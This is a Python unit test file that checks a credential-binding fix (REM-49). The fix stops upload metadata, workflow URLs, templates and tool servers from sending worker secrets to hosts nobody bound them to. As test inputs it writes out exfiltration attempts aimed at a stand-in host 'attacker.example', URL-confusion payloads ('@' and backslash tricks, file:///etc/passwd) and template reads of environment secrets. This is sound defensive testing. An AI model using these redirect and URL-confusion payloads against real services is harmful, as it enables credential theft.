"""A credential goes only to the origin the operator bound it to (REM-49).

The exploit these pin: `content.register_upload` is granted to `authenticated`,
its `p_metadata` becomes the upload's `ingest_policy`, and the ingest worker
merged that into a TranscribePolicy whose `endpoint` and `credential` it then
used as given -- so a signed-in user could have the worker send any secret in
its environment to their own host. Every refusal here is checked with a
transport that records requests, so "refused" means nothing left the process.
"""
import unittest
from unittest.mock import patch

import httpx

from percolate_core.agentic.contracts import ToolServer
from percolate_core.agentic.tools.auth import outbound_headers
from percolate_core.core.config import ConfigError
from percolate_core.core.credentials import CredentialRefused, credential_for
from percolate_core.ingest import parse
from percolate_core.ingest.embed import embed_texts
from percolate_core.ingest.policy import resolve as resolve_policy
from percolate_core.lake.engine import Lake, _catalog_headers
from percolate_core.worker.http import http_call
from percolate_core.worker.templates import TerminalError, resolve

OPENAI = "https://api.openai.com"
ATTACKER = "https://attacker.example"
ENV = {
    "LLM_API_KEY": "sk-unit-test",
    "P8_S3_SECRET": "storage-secret-unit-test",
    "LLM_URL": "https://model.example",
    "P8_CREDENTIAL_ORIGINS": '{"LLM_API_KEY": ["%s"]}' % OPENAI,
}


class Recorder:
    """A transport that answers everything and remembers what it was sent."""

    def __init__(self, body=None):
        self.requests = []
        self.body = body if body is not None else {"text": "hello from the recorded transcript", "language": "en"}

    def __call__(self, request):
        self.requests.append(request)
        return httpx.Response(200, json=self.body)

    def client(self, cls):
        real = cls
        return lambda *a, **kw: real(*a, transport=httpx.MockTransport(self), **kw)


class Env(unittest.TestCase):
    def setUp(self):
        env = patch.dict("os.environ", ENV, clear=True)
        env.start()
        self.addCleanup(env.stop)


class ResolverTest(Env):
    def test_an_unbound_credential_goes_nowhere(self):
        for ref in ("P8_S3_SECRET", "p8_s3_secret"):
            with self.subTest(ref=ref), self.assertRaises(CredentialRefused):
                credential_for(ref, "http://minio:9000/")

    def test_only_the_bound_origin_matches(self):
        self.assertEqual(credential_for("LLM_API_KEY", OPENAI + "/v1/embeddings"), "sk-unit-test")
        self.assertEqual(credential_for("llm_api_key", OPENAI + "/v1/x"), "sk-unit-test")
        for url in ("https://api.openai.com.attacker.example/v1", "http://api.openai.com/v1",
                    "https://api.openai.com:8443/v1", "https://api.openai.com@attacker.example/",
                    "https://attacker.example/?u=https://api.openai.com", "file:///etc/passwd",
                    "https://api.openai.com\\@attacker.example/", ATTACKER):
            with self.subTest(url=url), self.assertRaises(CredentialRefused):
                credential_for("LLM_API_KEY", url)

    def test_refusal_is_terminal_and_reads_as_configuration(self):
        with self.assertRaises(CredentialRefused) as caught:
            credential_for("LLM_API_KEY", ATTACKER)
        # Terminal for the worker loop, and a ConfigError for callers that
        # already treated an unresolvable credential as one.
        self.assertIsInstance(caught.exception, TerminalError)
        self.assertIsInstance(caught.exception, ConfigError)

    def test_the_ingest_setting_name_still_binds(self):
        with patch.dict("os.environ", {"GITHUB_TOKEN": "gh", "P8_CREDENTIAL_ORIGINS": "",
                                       "P8_INGEST_CREDENTIAL_ORIGINS": '{"GITHUB_TOKEN": "https://api.github.com"}'}):
            self.assertEqual(credential_for("GITHUB_TOKEN", "https://api.github.com/repos"), "gh")
            with self.assertRaises(CredentialRefused):
                credential_for("GITHUB_TOKEN", ATTACKER)

    def test_a_malformed_setting_refuses_rather_than_allowing(self):
        for raw in ("not json", '["https://api.openai.com"]', '{"LLM_API_KEY": 7}'):
            with self.subTest(raw=raw), patch.dict("os.environ", {"P8_CREDENTIAL_ORIGINS": raw}):
                with self.assertRaises(CredentialRefused):
                    credential_for("LLM_API_KEY", OPENAI)


class UploadPolicyTest(Env):
    """The exploit, through the same policy merge the ingest handler runs."""

    def transcribe(self, content_type, name, upload_policy):
        recorder = Recorder()
        _, policy = resolve_policy(content_type, name, upload_policy)
        with patch("percolate_core.ingest.transcribe.httpx.Client",
                   side_effect=recorder.client(httpx.Client)):
            try:
                return parse.to_markdown(b"RIFF....WAVE", policy, name), recorder
            except CredentialRefused as refused:
                return refused, recorder

    def test_an_upload_cannot_send_a_worker_secret_to_its_own_host(self):
        for label, content_type, name, upload in (
            ("names the storage secret", "audio/wav", "talk.wav",
             {"transcribe": {"endpoint": ATTACKER + "/v1/audio/transcriptions",
                             "credential": "P8_S3_SECRET"}}),
            ("keeps the default key, moves the endpoint", "audio/wav", "talk.wav",
             {"transcribe": {"endpoint": ATTACKER + "/v1/audio/transcriptions"}}),
            ("forces the transcriber onto a text upload", "text/plain", "notes.txt",
             {"parser": "transcribe",
              "transcribe": {"endpoint": ATTACKER + "/t", "credential": "P8_S3_SECRET"}}),
        ):
            with self.subTest(label):
                outcome, recorder = self.transcribe(content_type, name, upload)
                self.assertIsInstance(outcome, CredentialRefused)
                self.assertEqual(recorder.requests, [])
                self.assertNotIn("storage-secret", str(outcome))

    def test_the_bound_endpoint_still_transcribes(self):
        outcome, recorder = self.transcribe("audio/wav", "talk.wav", {})
        self.assertEqual(outcome.markdown, "hello from the recorded transcript")
        self.assertEqual(len(recorder.requests), 1)
        self.assertEqual(recorder.requests[0].headers["authorization"], "Bearer sk-unit-test")
        self.assertEqual(str(recorder.requests[0].url), OPENAI + "/v1/audio/transcriptions")


class WorkerHttpTest(Env, unittest.IsolatedAsyncioTestCase):
    async def call(self, spec, ctx=None):
        recorder = Recorder({"ok": True})
        with patch("percolate_core.worker.http.httpx.AsyncClient",
                   side_effect=recorder.client(httpx.AsyncClient)):
            try:
                return await http_call(spec, ctx or {}), recorder
            except CredentialRefused as refused:
                return refused, recorder

    async def test_a_row_credential_to_an_unbound_host_is_refused_before_sending(self):
        for label, spec, ctx in (
            ("literal url", {"url": ATTACKER + "/x", "method": "POST",
                             "credential_ref": "LLM_API_KEY"}, {}),
            ("url from the run input", {"url": "{{run.callback}}", "method": "POST",
                                        "credential_ref": "LLM_API_KEY"},
             {"run_input": {"callback": ATTACKER + "/hook"}}),
            ("a secret nobody bound", {"url": "http://minio:9000/", "credential_ref": "P8_S3_SECRET"}, {}),
            ("async mode sends later, so refuses now", {"url": ATTACKER, "mode": "async",
                                                       "credential_ref": "LLM_API_KEY"}, {}),
        ):
            with self.subTest(label):
                outcome, recorder = await self.call(spec, ctx)
                self.assertIsInstance(outcome, CredentialRefused)
                self.assertEqual(recorder.requests, [])

    async def test_a_bound_destination_still_receives_it(self):
        outcome, recorder = await self.call(
            {"url": OPENAI + "/v1/chat/completions", "method": "POST",
             "credential_ref": "LLM_API_KEY", "body": {"q": 1}})
        self.assertEqual(outcome["status"], 200)
        self.assertEqual(recorder.requests[0].headers["authorization"], "Bearer sk-unit-test")


class TemplateEnvTest(Env):
    def test_a_template_cannot_read_a_secret(self):
        for name in ("P8_S3_SECRET", "LLM_API_KEY", "P8_JWT_SECRET", "P8_DSN"):
            with self.subTest(name=name), self.assertRaises(TerminalError):
                resolve({"body": {"k": "{{env.%s}}" % name}}, {})

    def test_endpoints_resolve_and_the_operator_can_add_one(self):
        self.assertEqual(resolve("{{env.LLM_URL}}/v1", {}), "https://model.example/v1")
        with self.assertRaises(TerminalError):
            resolve("{{env.SEC_UA}}", {})
        with patch.dict("os.environ", {"SEC_UA": "Percolate ops@example.org",
                                       "P8_TEMPLATE_ENV": "SEC_UA"}):
            self.assertEqual(resolve("{{env.SEC_UA}}", {}), "Percolate ops@example.org")

    def test_listing_a_bound_credential_does_not_make_it_readable(self):
        with patch.dict("os.environ", {"P8_TEMPLATE_ENV": "LLM_API_KEY"}):
            with self.assertRaises(TerminalError):
                resolve("Bearer {{env.LLM_API_KEY}}", {})


class OtherSendersTest(Env, unittest.IsolatedAsyncioTestCase):
    def test_embedding_refuses_an_unbound_registry_url_before_sending(self):
        recorder = Recorder({"data": [{"embedding": [0.1]}]})
        spec = {"url": ATTACKER + "/embed", "credential_ref": "LLM_API_KEY",
                "batch": True, "body": {"input": ["x"]}, "model": "m"}
        with patch("percolate_core.ingest.embed.httpx.Client",
                   side_effect=recorder.client(httpx.Client)):
            with self.assertRaises(CredentialRefused):
                embed_texts(spec, ["x"])
            vectors, _ = embed_texts({**spec, "url": OPENAI + "/v1/embeddings"}, ["x"])
        self.assertEqual(vectors, [[0.1]])
        self.assertEqual([str(r.url) for r in recorder.requests], [OPENAI + "/v1/embeddings"])

    def test_the_lake_catalog_token_is_bound_too(self):
        lake = Lake(endpoint="http://minio:9000", key="k", secret="s", region="r",
                    bucket="b", catalog_url="http://lakekeeper:8181/catalog",
                    warehouse="w", catalog_token_ref="LAKE_TOKEN")
        with patch.dict("os.environ", {"LAKE_TOKEN": "lt"}):
            with self.assertRaises(CredentialRefused):
                _catalog_headers(lake)
            with patch.dict("os.environ", {"P8_CREDENTIAL_ORIGINS":
                                           '{"LAKE_TOKEN": "http://lakekeeper:8181"}'}):
                self.assertEqual(_catalog_headers(lake), {"Authorization": "Bearer lt"})

    async def test_a_tool_servers_credential_stays_on_its_own_origin(self):
        # REM-91 item 7: a tool server's credential now resolves through
        # credential_for like every other one in this package, so its origin has
        # to be bound. Before that the REGISTRATION origin alone was enough --
        # which is no check at all when whoever registered the server chose that
        # origin, and `tool_servers:update` is a permission a person can hold.
        server = ToolServer(name="ext", kind="openapi", url="https://tools.example/",
                            credential_ref="env:LLM_API_KEY")
        with patch.dict("os.environ", {"P8_CREDENTIAL_ORIGINS":
                                       '{"LLM_API_KEY": ["https://tools.example"]}'}):
            self.assertEqual(
                (await outbound_headers(server))["Authorization"], "Bearer sk-unit-test")
            # The destination still has to match the registration, as before.
            self.assertNotIn(
                "Authorization", await outbound_headers(server, url=ATTACKER + "/x"))
        # And with no binding at all the same call is refused rather than sent.
        with self.assertRaises(CredentialRefused):
            await outbound_headers(server)


if __name__ == "__main__":
    unittest.main()
